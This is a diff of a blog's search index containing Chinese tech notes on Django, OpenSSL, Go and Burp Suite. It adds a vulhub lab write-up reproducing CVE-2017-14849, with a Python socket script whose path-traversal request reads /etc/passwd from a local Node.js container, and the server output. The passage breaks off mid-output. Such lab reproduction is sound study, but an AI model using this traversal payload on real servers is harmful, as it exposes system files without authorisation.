@@ -1,71 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>manage.py报错 ModuleNotFoundError No module named &#39;django&#39;</title>
-    <url>/2023/07/modulenotfounderror-no-module-named-django/</url>
-    <content><![CDATA[<p>出现场景：我在Windows系统写好了一个django项目，复制到Ubuntu中,运行<code>python3 manage.py migrate</code>一切正常，但运行<code>python3 manage.py runserver</code>报错：</p>
-<span id="more"></span>
-
-<blockquote>
-<p>Traceback (most recent call last):<br>  File “manage.py”, line 11, in main<br>    from django.core.management import execute_from_command_line<br>ModuleNotFoundError: No module named ‘django’</p>
-<p>The above exception was the direct cause of the following exception:</p>
-<p>Traceback (most recent call last):<br>  File “manage.py”, line 22, in <module><br>    main()<br>  File “manage.py”, line 13, in main<br>    raise ImportError(<br>ImportError: Couldn’t import Django. Are you sure it’s installed and available on your PYTHONPATH environment variable? Did you forget to activate a virtual environment?</p>
-</blockquote>
-<p><img src="/2023/07/modulenotfounderror-no-module-named-django/image-20230721020550252.png" alt="报错信息"></p>
-<p>在终端中进入python3，<code>import django</code>也不报错。网上很多方法，要么需要安装虚拟环境太复杂，要么完全无效。我突然想到可能是Linux环境下创建项目时的<code>manage.py</code>有不同，于是创建项目<code>django-admin startproject my_project</code>，提示：</p>
-<p><img src="/2023/07/modulenotfounderror-no-module-named-django/image-20230721020956851.png" alt="提示信息"></p>
-<p>安装完成以后，神奇地发现，<code>python3 manage.py runserver</code>成功运行了！</p>
-<p><img src="/2023/07/modulenotfounderror-no-module-named-django/image-20230721021237845.png" alt="运行成功"></p>
-]]></content>
-      <categories>
-        <category>bug记录</category>
-      </categories>
-      <tags>
-        <tag>bug记录</tag>
-        <tag>python</tag>
-        <tag>django</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C#报错 assemblyinfo.cs could not be found</title>
-    <url>/2023/06/c-bao-cuo-assemblyinfo-cs-could-not-be-found/</url>
-    <content><![CDATA[<p>下载<code>xxe-lab</code>进行实验时，发现C#的项目无法运行，提示<code>Properties/assemblyinfo.cs could not be found</code></p>
-<span id="more"></span>
-
-<p>因为没学过C#，下这个项目仅仅是为了实验，所以网上的解决方案我试过并不起作用。最后方法是根据报错的路径，新建<code>Properties</code>文件夹和<code>Properties/assemblyinfo.cs </code>文件即可，成功运行。</p>
-]]></content>
-      <categories>
-        <category>bug记录</category>
-      </categories>
-      <tags>
-        <tag>bug记录</tag>
-        <tag>C#</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>No PEM start marker b-----BEGIN RSA PRIVATE KEY----- found</title>
-    <url>/2023/05/no-pem-start-marker-b-begin-rsa-private-key-found/</url>
-    <content><![CDATA[<p>出现场景为使用python的<code>rsa</code>库读取openssl生成的公钥私钥进行加密和解密操作时。</p>
-<span id="more"></span>
-
-<p>RSA库用的是pkcs1格式的密钥文件，而如果之前生成的是pkcs8格式，会出现错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No PEM start marker &quot;b&#x27;-----BEGIN RSA PRIVATE KEY-----&#x27;&quot; found</span><br></pre></td></tr></table></figure>
-
-<p>对于公钥读取，可以用<code>load_pkcs1_openssl_pem</code>方法代替<code>load_pkcs1</code>；对于私钥，只能用openssl命令把pkcs8格式转换为pkcs1了：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -in pri_key.pem -nocrypt -out private_pkcs1.pem -traditional</span><br></pre></td></tr></table></figure>
-
-<p>似乎有的版本不需要<code>-traditional</code>。</p>
-<p><img src="/2023/05/no-pem-start-marker-b-begin-rsa-private-key-found/image-20230530172311009.png" alt="pkcs1.pem的开头为BEGIN RSA PRIVATE KEY"></p>
-]]></content>
-      <categories>
-        <category>bug记录</category>
-      </categories>
-      <tags>
-        <tag>bug记录</tag>
-        <tag>openssl</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTTPS流量抓包分析(附代码验证)</title>
     <url>/2023/05/https-liu-liang-zhua-bao-fen-xi/</url>
     <content><![CDATA[<p>本文的https流量分析基于之前自己生成的密钥、证书和搭建的支持https访问的apache服务器<a href="/2023/05/openssl-xue-xi-bi-ji/" title="OpenSSL学习笔记">OpenSSL学习笔记</a>。</p>
@@ -279,6 +214,71 @@
       </tags>
   </entry>
   <entry>
+    <title>C#报错 assemblyinfo.cs could not be found</title>
+    <url>/2023/06/c-bao-cuo-assemblyinfo-cs-could-not-be-found/</url>
+    <content><![CDATA[<p>下载<code>xxe-lab</code>进行实验时，发现C#的项目无法运行，提示<code>Properties/assemblyinfo.cs could not be found</code></p>
+<span id="more"></span>
+
+<p>因为没学过C#，下这个项目仅仅是为了实验，所以网上的解决方案我试过并不起作用。最后方法是根据报错的路径，新建<code>Properties</code>文件夹和<code>Properties/assemblyinfo.cs </code>文件即可，成功运行。</p>
+]]></content>
+      <categories>
+        <category>bug记录</category>
+      </categories>
+      <tags>
+        <tag>C#</tag>
+        <tag>bug记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>manage.py报错 ModuleNotFoundError No module named &#39;django&#39;</title>
+    <url>/2023/07/modulenotfounderror-no-module-named-django/</url>
+    <content><![CDATA[<p>出现场景：我在Windows系统写好了一个django项目，复制到Ubuntu中,运行<code>python3 manage.py migrate</code>一切正常，但运行<code>python3 manage.py runserver</code>报错：</p>
+<span id="more"></span>
+
+<blockquote>
+<p>Traceback (most recent call last):<br>  File “manage.py”, line 11, in main<br>    from django.core.management import execute_from_command_line<br>ModuleNotFoundError: No module named ‘django’</p>
+<p>The above exception was the direct cause of the following exception:</p>
+<p>Traceback (most recent call last):<br>  File “manage.py”, line 22, in <module><br>    main()<br>  File “manage.py”, line 13, in main<br>    raise ImportError(<br>ImportError: Couldn’t import Django. Are you sure it’s installed and available on your PYTHONPATH environment variable? Did you forget to activate a virtual environment?</p>
+</blockquote>
+<p><img src="/2023/07/modulenotfounderror-no-module-named-django/image-20230721020550252.png" alt="报错信息"></p>
+<p>在终端中进入python3，<code>import django</code>也不报错。网上很多方法，要么需要安装虚拟环境太复杂，要么完全无效。我突然想到可能是Linux环境下创建项目时的<code>manage.py</code>有不同，于是创建项目<code>django-admin startproject my_project</code>，提示：</p>
+<p><img src="/2023/07/modulenotfounderror-no-module-named-django/image-20230721020956851.png" alt="提示信息"></p>
+<p>安装完成以后，神奇地发现，<code>python3 manage.py runserver</code>成功运行了！</p>
+<p><img src="/2023/07/modulenotfounderror-no-module-named-django/image-20230721021237845.png" alt="运行成功"></p>
+]]></content>
+      <categories>
+        <category>bug记录</category>
+      </categories>
+      <tags>
+        <tag>bug记录</tag>
+        <tag>python</tag>
+        <tag>django</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>No PEM start marker b-----BEGIN RSA PRIVATE KEY----- found</title>
+    <url>/2023/05/no-pem-start-marker-b-begin-rsa-private-key-found/</url>
+    <content><![CDATA[<p>出现场景为使用python的<code>rsa</code>库读取openssl生成的公钥私钥进行加密和解密操作时。</p>
+<span id="more"></span>
+
+<p>RSA库用的是pkcs1格式的密钥文件，而如果之前生成的是pkcs8格式，会出现错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No PEM start marker &quot;b&#x27;-----BEGIN RSA PRIVATE KEY-----&#x27;&quot; found</span><br></pre></td></tr></table></figure>
+
+<p>对于公钥读取，可以用<code>load_pkcs1_openssl_pem</code>方法代替<code>load_pkcs1</code>；对于私钥，只能用openssl命令把pkcs8格式转换为pkcs1了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -in pri_key.pem -nocrypt -out private_pkcs1.pem -traditional</span><br></pre></td></tr></table></figure>
+
+<p>似乎有的版本不需要<code>-traditional</code>。</p>
+<p><img src="/2023/05/no-pem-start-marker-b-begin-rsa-private-key-found/image-20230530172311009.png" alt="pkcs1.pem的开头为BEGIN RSA PRIVATE KEY"></p>
+]]></content>
+      <categories>
+        <category>bug记录</category>
+      </categories>
+      <tags>
+        <tag>openssl</tag>
+        <tag>bug记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OpenSSL学习笔记</title>
     <url>/2023/05/openssl-xue-xi-bi-ji/</url>
     <content><![CDATA[<p>OpenSSL 是一个开源软件库，提供了一组用于处理安全通信的工具和库函数，它可以用于多种不同的用途。</p>
@@ -467,40 +467,6 @@
       </tags>
   </entry>
   <entry>
-    <title>burp_suite学习笔记</title>
-    <url>/2024/01/burp-suite-xue-xi-bi-ji/</url>
-    <content><![CDATA[<p>burp_suite是网络安全的常用工具,功能强大，本文使用的版本为1.7。</p>
-<p>长期更新</p>
-<span id="more"></span>
-
-<p>初始界面如下:<br><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102204658435.png" alt="burp-suite界面"></p>
-<h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><p>proxy设置burp suite的代理，浏览器使用代理访问网站，burp suite可以进行中间人攻击。</p>
-<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102205523401.png" alt="代理设置"></p>
-<h3 id="配置https代理"><a href="#配置https代理" class="headerlink" title="配置https代理"></a>配置https代理</h3><p>https因为被加密，burp suite无法解密，所以初始情况只能抓http包，要抓https包需要先配置证书。</p>
-<p>访问此时的代理地址：</p>
-<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211236817.png" alt="代理地址"></p>
-<p>选择右边的<code>CA certificate</code>，下载证书后导入。</p>
-<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211455552.png"></p>
-<p>并设置浏览器代理：</p>
-<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211658516.png"></p>
-<p>成功抓取到https包：</p>
-<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211853395.png" alt="访问了百度"></p>
-<h2 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h2><p>Burp Suite的spider可以爬行扫描出网站上所有的链接,通过对这些链接的详细扫描来发现Web应用程序的漏洞。</p>
-<h2 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h2><p>扫描器</p>
-<h2 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>此功能可用语多种用途,如利用漏洞,Web应用程序模糊测试,进行暴力猜解等.</p>
-<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>此功能用于根据不同的情况修改和发送相同的请求次数并分析.</p>
-<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>此功能主要用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试.</p>
-<h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p>此功能可用于解码数据找回原来的数据形式,或者进行编码和加密数据.</p>
-<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较.</p>
-]]></content>
-      <categories>
-        <category>网络空间安全</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Spring初体验</title>
     <url>/2023/05/spring-chu-ti-yan/</url>
     <content><![CDATA[<h1 id="Spring-初体验："><a href="#Spring-初体验：" class="headerlink" title="Spring 初体验："></a>Spring 初体验：</h1><p>俗话说“没学过spring等于没学过Java”，spring在Java领域的地位可见一斑。在Java中，Spring是一个开源的应用程序框架，用于构建企业级Java应用程序。它提供了一个轻量级的、非侵入性的编程和配置模型，用于开发灵活、可扩展的应用程序。笔者Java水平很低，但由于课程的原因写了好久的Java代码，顺便学习一下spring吧。</p>
@@ -624,6 +590,81 @@
       </tags>
   </entry>
   <entry>
+    <title>burp_suite学习笔记</title>
+    <url>/2024/01/burp-suite-xue-xi-bi-ji/</url>
+    <content><![CDATA[<p>burp_suite是网络安全的常用工具,功能强大，本文使用的版本为1.7。</p>
+<p>长期更新</p>
+<span id="more"></span>
+
+<p>初始界面如下:<br><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102204658435.png" alt="burp-suite界面"></p>
+<h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><p>proxy设置burp suite的代理，浏览器使用代理访问网站，burp suite可以进行中间人攻击。</p>
+<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102205523401.png" alt="代理设置"></p>
+<h3 id="配置https代理"><a href="#配置https代理" class="headerlink" title="配置https代理"></a>配置https代理</h3><p>https因为被加密，burp suite无法解密，所以初始情况只能抓http包，要抓https包需要先配置证书。</p>
+<p>访问此时的代理地址：</p>
+<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211236817.png" alt="代理地址"></p>
+<p>选择右边的<code>CA certificate</code>，下载证书后导入。</p>
+<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211455552.png"></p>
+<p>并设置浏览器代理：</p>
+<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211658516.png"></p>
+<p>成功抓取到https包：</p>
+<p><img src="/2024/01/burp-suite-xue-xi-bi-ji/image-20240102211853395.png" alt="访问了百度"></p>
+<h2 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h2><p>Burp Suite的spider可以爬行扫描出网站上所有的链接,通过对这些链接的详细扫描来发现Web应用程序的漏洞。</p>
+<h2 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h2><p>扫描器</p>
+<h2 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>此功能可用语多种用途,如利用漏洞,Web应用程序模糊测试,进行暴力猜解等.</p>
+<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>此功能用于根据不同的情况修改和发送相同的请求次数并分析.</p>
+<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>此功能主要用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试.</p>
+<h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p>此功能可用于解码数据找回原来的数据形式,或者进行编码和加密数据.</p>
+<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较.</p>
+]]></content>
+      <categories>
+        <category>网络空间安全</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ltsMyG0</title>
+    <url>/2024/07/ltsmyg0/</url>
+    <content><![CDATA[<p>长期更新导致的。我从来没有觉得写golang是一件开心的事情。</p>
+<span id="more"></span>
+
+<h2 id="Gin实现简单的RESTful-API"><a href="#Gin实现简单的RESTful-API" class="headerlink" title="Gin实现简单的RESTful API"></a>Gin实现简单的RESTful API</h2><p>参考官方给出的教程实现<a href="https://go.dev/doc/tutorial/web-service-gin">https://go.dev/doc/tutorial/web-service-gin</a></p>
+<p>整体代码：</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> blog <span class="keyword">struct</span> &#123;</span><br><span class="line">	Title  <span class="type">string</span> <span class="string">`json:&quot;title&quot;`</span></span><br><span class="line">	Length <span class="type">int</span>    <span class="string">`json:&quot;length&quot;`</span></span><br><span class="line">	Date   <span class="type">string</span> <span class="string">`json:&quot;date&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blogs = []blog&#123;</span><br><span class="line">	&#123;Title: <span class="string">&quot;Go&quot;</span>, Length: <span class="number">4000</span>, Date: <span class="string">&quot;04-16&quot;</span>&#125;,</span><br><span class="line">	&#123;Title: <span class="string">&quot;Python&quot;</span>, Length: <span class="number">5000</span>, Date: <span class="string">&quot;04-22&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getBlogs</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 缩进格式json</span></span><br><span class="line">	c.IndentedJSON(http.StatusOK, blogs)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">postBlogs</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> newBlog blog</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := c.BindJSON(&amp;newBlog); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	blogs = <span class="built_in">append</span>(blogs, newBlog)</span><br><span class="line">	c.JSON(http.StatusOK, newBlog)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	router := gin.Default()</span><br><span class="line">	router.GET(<span class="string">&quot;/blog&quot;</span>, getBlogs)</span><br><span class="line">	router.POST(<span class="string">&quot;/blog&quot;</span>, postBlogs)</span><br><span class="line">	router.Run(<span class="string">&quot;localhost:8080&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>struct</code>中的变量最后面的字符串，指定了转换成json时的<code>key</code>。go有两种形式表示字符串，一种是<code>&quot;</code>，另一个就是`，这样字符串内部的<code>&quot;</code>就不需要转义了。</p>
+<p>值得一提的是，如果是Windows环境，使用<code>curl</code>传递json数据，里面的<code>&quot;</code>需要转义。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST http://localhost:<span class="number">8080</span>/blog -H &quot;Content-<span class="built_in">Type</span>: application/json&quot; -d &quot;&#123;\&quot;<span class="built_in">title</span>\&quot;:\&quot;Java\&quot;,\&quot;length\&quot;:<span class="number">1000</span>,\&quot;<span class="built_in">date</span>\&quot;:\&quot;<span class="number">05</span>-<span class="number">01</span>\&quot;&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><p>go的string是只读的，可以转换成<code>[]byte</code>来进行修改，<code>strings</code>库实现了一些高级操作：</p>
+<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := <span class="string">&quot;it is my go&quot;</span></span><br><span class="line">fmt.Println(strings.Index(s, <span class="string">&quot;go&quot;</span>))</span><br><span class="line">fmt.Println(strings.Index(s, <span class="string">&quot;og&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="number">9</span></span><br><span class="line"><span class="selector-tag">-1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fmt.Println(strings.Replace(s, <span class="string">&quot;my&quot;</span>, <span class="string">&quot;your&quot;</span>, <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">it</span> <span class="selector-tag">is</span> <span class="selector-tag">your</span> <span class="selector-tag">go</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="切分"><a href="#切分" class="headerlink" title="切分"></a>切分</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">parts := strings.Split(s, <span class="string">&quot; &quot;</span>)</span><br><span class="line">fmt.Println(parts)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[it is my go]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s2 := <span class="string">&quot;   go lang  &quot;</span></span><br><span class="line">fmt.Println(strings.Trim(s2, <span class="string">&quot; &quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">go</span> <span class="selector-tag">lang</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>go</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>go</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pandoc报错Missing character</title>
     <url>/2024/06/pandoc-bao-cuo-missing-character/</url>
     <content><![CDATA[<p>使用pandoc把markdown(使用了bib管理文献引用所以需要latex)转换成pdf时发现报错：</p>
@@ -670,6 +711,31 @@
       </tags>
   </entry>
   <entry>
+    <title>scienceplots的ieee风格图片过大</title>
+    <url>/2024/06/scienceplots-de-ieee-feng-ge-tu-pian-guo-da/</url>
+    <content><![CDATA[<p>scienceplots是科研绘图工具，但是使用ieee风格时发现图片中的元素非常大，很影响观感。</p>
+<span id="more"></span>
+
+<p>查看mplstyle文件就可以发现端倪。</p>
+<p>在python路径中找到<code>Lib\site-packages\scienceplots\styles\journals\ieee.mplstyle</code></p>
+<p><img src="/2024/06/scienceplots-de-ieee-feng-ge-tu-pian-guo-da/image-20240612212329105.png" alt="image-20240612212329105"></p>
+<p>可以发现dpi非常非常大，在文件中调小dpi即可。</p>
+<p>或者在代码中加入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> plt.style.context([<span class="string">&#x27;ieee&#x27;</span>]):</span><br><span class="line">        plt.rcParams.update(&#123;<span class="string">&#x27;figure.dpi&#x27;</span>: <span class="string">&#x27;200&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>解决。</p>
+<p>其实官方wiki中也说了这个问题，不过当时搜中文确实没找到答案。</p>
+<p><img src="/2024/06/scienceplots-de-ieee-feng-ge-tu-pian-guo-da/image-20240612212724716.png" alt="image-20240612212724716"></p>
+]]></content>
+      <categories>
+        <category>bug记录</category>
+      </categories>
+      <tags>
+        <tag>bug记录</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tcpdump定时定量抓包</title>
     <url>/2023/08/tcpdump-ding-shi-ding-liang-zhua-bao/</url>
     <content><![CDATA[<h1 id="TCPDUMP定时定量抓包"><a href="#TCPDUMP定时定量抓包" class="headerlink" title="TCPDUMP定时定量抓包"></a>TCPDUMP定时定量抓包</h1><p>假设我们用<code>xshell</code>远程连接服务器，需要获取一段时间内的数据包，且由于硬盘大小有效，需要限制抓取的数据包文件的大小，应该怎么做？</p>
@@ -709,28 +775,87 @@
       </tags>
   </entry>
   <entry>
-    <title>scienceplots的ieee风格图片过大</title>
-    <url>/2024/06/scienceplots-de-ieee-feng-ge-tu-pian-guo-da/</url>
-    <content><![CDATA[<p>scienceplots是科研绘图工具，但是使用ieee风格时发现图片中的元素非常大，很影响观感。</p>
+    <title>vulhub:node-CVE-2017-14849漏洞复现和浅析</title>
+    <url>/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/</url>
+    <content><![CDATA[<p><code>CVE-2017-14849</code>是Node.js 8.5.0 版本中路径检查时出现的安全漏洞。参考github中vulhub项目的readme：</p>
+<blockquote>
+<p>原因是 Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致向上层跳跃的时候（如<code>../../../../../../etc/passwd</code>），在中间位置增加<code>foo/../</code>（如<code>../../../foo/../../../../etc/passwd</code>），即可使<code>normalize</code>返回<code>/etc/passwd</code>，但实际上正确结果应该是<code>../../../../../../etc/passwd</code>。</p>
+<p>express这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于<code>normalize</code>函数。比如，express在判断path是否超出静态目录范围时，就用到了<code>normalize</code>函数，上述BUG导致<code>normalize</code>函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。</p>
+</blockquote>
+<p>这篇写烂了，水平不足。</p>
 <span id="more"></span>
 
-<p>查看mplstyle文件就可以发现端倪。</p>
-<p>在python路径中找到<code>Lib\site-packages\scienceplots\styles\journals\ieee.mplstyle</code></p>
-<p><img src="/2024/06/scienceplots-de-ieee-feng-ge-tu-pian-guo-da/image-20240612212329105.png" alt="image-20240612212329105"></p>
-<p>可以发现dpi非常非常大，在文件中调小dpi即可。</p>
-<p>或者在代码中加入</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> plt.style.context([<span class="string">&#x27;ieee&#x27;</span>]):</span><br><span class="line">        plt.rcParams.update(&#123;<span class="string">&#x27;figure.dpi&#x27;</span>: <span class="string">&#x27;200&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>跳转到<code>vulhub-master/node/CVE-2017-14849</code>目录，执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 
-<p>解决。</p>
-<p>其实官方wiki中也说了这个问题，不过当时搜中文确实没找到答案。</p>
-<p><img src="/2024/06/scienceplots-de-ieee-feng-ge-tu-pian-guo-da/image-20240612212724716.png" alt="image-20240612212724716"></p>
+<p>访问<code>127.0.0.1:3000</code>，正常运行，且存在静态文件服务器：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930201821803.png" alt="运行界面"></p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930201932340.png" alt="静态文件"></p>
+<p>由于浏览器和python的requests库似乎都会对url进行规范化，导致<code>../</code>被处理(有点坑)，所以这里采用python的<code>socket</code>库和<code>burp suite</code>复现：</p>
+<p>首先尝试<code>static/../../../../../../../etc/passwd</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HOST = <span class="string">&quot;&quot;</span></span><br><span class="line">PORT = <span class="number">3000</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">request = (</span><br><span class="line">    <span class="string">&quot;GET /static/../../../../../../../etc/passwd HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Host: ip:3000\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Accept: */*\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Accept-Language: en\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    s.sendall(request.encode())</span><br><span class="line">    data = s.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br></pre></td></tr></table></figure>
+
+<p>返回结果:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Content-Type: text/html; charset=utf-8     </span><br><span class="line">Content-Length: 177</span><br><span class="line">Date: Sat, 30 Sep 2023 12:22:41 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>Cannot GET /static/../../../../../../../etc/passwd<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>改为<code>/static/../../../a/../../../../etc/passwd</code>以后，返回结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Cache-Control: public, max-age=0</span><br><span class="line">Last-Modified: Wed, 13 Sep 2017 20:05:31 GMT</span><br><span class="line">ETag: W/&quot;4d4-15e7cd8b6f8&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 1236</span><br><span class="line">Date: Sat, 30 Sep 2023 12:29:01 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span 